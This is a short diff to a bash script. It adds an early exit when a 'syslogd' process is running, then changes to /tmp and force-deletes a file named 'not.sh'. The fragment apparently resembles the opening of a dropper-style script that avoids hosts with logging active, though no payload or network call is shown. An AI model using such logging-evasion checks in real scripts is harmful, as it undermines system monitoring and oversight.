@@ -1,5 +1,8 @@
 #!/bin/bash
 
+if pgrep -x "syslogd" >/dev/null; then
+  exit 0
+fi
 # Go to /tmp
 cd /tmp
 rm -rf not.sh
